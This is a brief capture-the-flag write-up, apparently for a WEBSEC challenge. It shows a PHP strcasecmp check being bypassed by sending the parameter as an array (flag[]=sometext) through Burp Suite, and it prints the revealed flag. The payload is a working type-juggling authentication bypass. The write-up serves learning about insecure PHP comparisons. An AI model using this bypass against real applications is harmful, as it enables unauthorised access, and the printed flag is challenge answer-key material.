```
 if (! strcasecmp ($_POST['flag'], $flag))
               echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>'; 
```                     

"The strcasecmp() function will return 0 if any of the parameters is an array"

STEP 1: Intercept in Burp Suite

STEP 2: flag=sometext&submit=Go
OUTPUT: Invalid flag, sorry.

STEP 3: flag[]=sometext&submit=Go
OUTPUT: WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}

REFERENCE: https://eatingrsa.wordpress.com/tag/login-bypass/
